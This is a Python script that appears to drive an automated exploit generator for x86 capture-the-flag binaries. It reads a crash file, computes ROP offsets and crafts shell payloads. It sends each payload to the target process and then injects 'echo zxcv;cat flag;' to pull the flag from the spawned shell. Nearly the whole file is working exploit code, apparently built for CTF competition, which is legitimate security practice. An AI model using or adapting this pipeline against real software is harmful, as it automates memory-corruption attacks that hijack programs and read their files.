from .x86_attack.init import *
from .x86_attack.analyze import *
import sys
from .x86_attack.shell_craft import *

if __name__ == '__main__':
    info = {}
    lcs = {}
    rop_and_index = {}
    payload = []
    flag = []
    binary = sys.argv[1]
    crash_file = sys.argv[2]
    f = open(crash_file, 'r')
    crash = f.read()
    f.close()

    init = init(binary, crash_file)
    info = init.get_state()
    #print INFO

    analyze = analyze(info, binary, crash)
    lcs = analyze.find_lcs()
    if lcs == -1:
        sys.exit(0)
    rop_and_index = analyze.calc_index()

    shell = shell_craft(binary, crash, rop_and_index, info)
    payload = shell.create_payload()

    for i in payload:
        p = process(binary)

        p.sendline(i)
        p.sendline('echo zxcv;cat flag;')
        try:
            p.recvuntil('zxcv\n')
            flag.append(p.recvuntil('}'))
            p.close()
        except:
            p.close()
            pass

    for i in flag:
        if i is not '':
            log.info(i)







